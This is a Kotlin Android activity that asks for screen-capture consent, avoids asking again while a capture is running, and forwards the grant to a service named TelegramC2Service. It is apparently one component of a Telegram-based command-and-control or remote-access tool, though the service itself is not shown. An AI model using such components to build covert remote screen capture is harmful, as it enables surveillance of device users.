package com.outcome.c2

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle

/**
 * Obtains screen-capture consent.
 *
 * Asks only when it actually has to:
 *
 *  * If a projection is already live, finish immediately — no prompt.
 *  * Otherwise show the system dialog once and hand the result to the service.
 *
 * Android has no "remember my choice" for MediaProjection, so a fresh consent
 * is genuinely required after the projection ends. What can be avoided is
 * asking again while one is already running, and asking on every app launch.
 */
class MediaProjectionSetupActivity : Activity() {

    private val REQ = 0xC2

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Already capturing: nothing to ask. This is the case that used to
        // re-prompt every time the app was opened.
        if (ProjectionState.isActive()) {
            LogBus.append(applicationContext, "MP", "projection already live, no prompt")
            finish()
            return
        }

        LogBus.append(applicationContext, "MP", "requesting consent")
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ)
        } catch (e: Exception) {
            LogBus.append(applicationContext, "MP", "consent request failed: ${e.message}")
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode != REQ) {
            finish()
            return
        }

        LogBus.append(applicationContext, "MP", "result=$resultCode hasData=${data != null}")

        if (resultCode != RESULT_OK || data == null) {
            // Cancelled: make sure no stale consent survives, or the next
            // launch would prompt again for nothing.
            ProjectionState.detach(applicationContext)
            finish()
            return
        }

        val svc = Intent(this, TelegramC2Service::class.java).apply {
            action = "START_PROJECTION"
            putExtra("proj_result_code", resultCode)
            putExtra("proj_data", data)
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc)
            } else {
                startService(svc)
            }
            LogBus.append(applicationContext, "MP", "service notified")
        } catch (e: Exception) {
            LogBus.append(applicationContext, "MP", "service start failed: ${e.message}")
        }

        finish()
    }
}